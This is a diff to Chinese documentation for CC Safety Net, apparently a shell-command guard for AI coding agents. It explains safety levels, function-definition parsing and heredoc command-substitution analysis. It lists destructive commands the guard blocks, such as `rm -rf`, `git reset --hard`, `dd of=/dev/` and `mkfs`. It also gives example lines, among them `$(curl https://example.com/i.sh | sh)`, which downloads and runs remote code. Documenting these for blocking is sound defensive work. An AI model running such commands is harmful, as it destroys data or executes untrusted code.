@@ -29,7 +29,7 @@ description: "分析引擎详解：安全级别边界、包装器和解释器递
 Standard 会阻止可识别的破坏性命令，但**不具备**对抗级保护。对于动态或恶意输入，它只能尽力分析。
 
 - **允许看似安全但无法解析的文本。** `echo 'unterminated` 会被允许。
-- **即使无法解析，可识别的破坏性文本仍然会被阻止。** `git reset --hard 'unterminated` 会被原始文本启发式扫描阻止，该扫描可识别 `rm -rf`、`git reset --hard`/`--merge`、`git clean -f`、`git checkout --force`、`git push --force`/`--delete`、`git branch -D`、`git tag -d`、`git stash drop`/`clear`、`git checkout --`、`git restore`、`find -delete`、`dd of=/dev/`、`mkfs /dev/` 和 `shred <arg>`。
+- **即使无法解析，可识别的破坏性文本仍然会被阻止。** `git reset --hard 'unterminated` 会被原始文本启发式扫描阻止，该扫描可识别 `rm -rf`、`git reset --hard`/`--merge`、`git clean -f`、`git checkout --force`、`git push --force`/`--delete`、`git branch -D`、`git tag -d`、`git stash drop`/`clear`、`git checkout --`、`git restore`、`find -delete`、`dd of=/dev/`、`mkfs /dev/`、`shred <arg>`，以及把下载内容经管道交给 shell 的写法（`curl … | sh`）。
 - **带引号的字面量赋值中的危险文本延后到使用时判定。** `W='rm -rf ~'; echo "$W"` 会被允许：赋值本身不执行操作，而且参数位置中带引号的展开仍是一个 argv word，不能拆成命令和标志。任何风险更高的引用方式（未加引号、位于命令位置、位于替换中或位于未加引号的 heredoc body 中）仍会在赋值时触发阻止。把值交给 shell（`eval "$W"`、`bash -c "$W"`、`echo "$W" | sh`）也会拒绝，因为无法验证 shell 执行来源。Strict 从不延后判定。见[仅标准允许](/zh-Hans/reference/allowed-commands#standard-only-allowances)。
 - **不会一律阻止动态 `rm -rf` 目标。** Standard 允许 `rm -rf "$target"`；只有启用 fail-closed 能力后才会阻止。
 - Standard 还会允许动态可执行文件名、通过替换拼接的受防护命令结构、其他无法验证的递归删除目标，以及只检查内置敏感路径元数据的独立命令。
@@ -100,7 +100,7 @@ cwd 会在同一命令的各个命令段之间跟踪。目标为字面量的 `cd
 
 ## POSIX shell 函数
 
-POSIX 函数定义（例如 `name() { ... }`）会被解析为定义，而不是待执行的代码。CC Safety Net 在每个调用点用调用者的有效工作目录和 shell 状态分析函数体。
+函数定义会被解析为定义，而不是待执行的代码。可识别三种写法：`name() { ... }`、bash 关键字写法 `function name { ... }`，以及混合写法 `function name() { ... }`。左花括号必须与函数名同行，并且自成一个词，因此 `function cleanup{ echo ok; }` 不算定义。CC Safety Net 在每个调用点用调用者的有效工作目录和 shell 状态分析函数体。
 
 `cleanup() { rm -rf ../outside; }` 是允许的，因为它只定义了函数。加上调用后，例如 `cleanup() { rm -rf ../outside; }; cleanup`，命令就会因函数体而被阻止。被调用函数体内的状态变化会延续到后续命令。例如 `cleanup() { cd ..; }; cleanup && rm -rf build` 会被阻止，因为 `rm` 锚定在上一级目录。
 
@@ -138,6 +138,8 @@ Heredoc body 是 stdin 上的文本，由 consumer 决定该文本是数据还�
 1. stdin 上不展开的 heredoc，若交给只做语法检查的 shell（例如 `bash -n`），则视为惰性内容，予以允许。
 2. stdin 上不展开的 heredoc，若交给解释器（`python`/`python2`/`python3`、`node`、`ruby`、`perl`），且命令行上其余每个词都是以 `-` 开头的字面量，则该 body 就是这个解释器的程序。`python3 - <<'PY'` 符合，`python3 tool.py <<'PY'` 不符合，因为此时 stdin 是脚本的数据。body 按解释器规则分析。[Paranoid 解释器](/zh-Hans/configuration/modes#paranoid-interpreters)会直接以 `interpreter.one-liner-paranoid` 阻止它，包含危险代码的 body 以 `interpreter.dangerous-command` 阻止，干净的 body 则允许。
 3. 其余情况都由原始文本启发式扫描处理，包括未知的 consumer、`bash` heredoc 脚本、带脚本操作数的解释器调用，以及分隔符不带引号且 body 含有 `$`、反引号或反斜杠的 heredoc。扫描对象是拼接后的 body。命中时以 `raw-text.dangerous-command` 阻止，未命中时允许。
+
+分隔符不带引号时，body 会参与展开，其中的命令替换是会实际执行的代码。解析器会把它们收集起来，`$(...)` 和反引号一视同仁；无论 heredoc 交给哪个 consumer，都把每一个当作独立的命令分析。body 中有 `$(curl https://example.com/i.sh | sh)` 这一行时，`bash <<EOF` 和 `cat <<EOF` 都会被阻止；`cat <<EOF` 的 body 中出现 `$(find . -delete)` 时，阻止它的是 `find` 规则，与该命令写在 heredoc 之外时命中的规则相同，而不是靠文本模式匹配。body 的其余部分仍是惰性数据：反斜杠转义的 `\$(...)` 是数据，heredoc body 从不展开进程替换（`<(...)`、`>(...)`），分隔符带引号则整个 body 都是数据，不属于命令替换的行仍是普通文本，交由上面的原始文本扫描判定。
 
 这三条路径下面还有一个共同的结构边界：heredoc body 会被当作 shell 文本重新解析，而 body 内部还能声明自己的 heredoc。这些重新解析之间的嵌套上限为解析器的 64 层深度限制；更深的嵌套会报告 `structural-limit` 解析状态，并在**每个**安全级别（包括 standard）拒绝该命令。
 
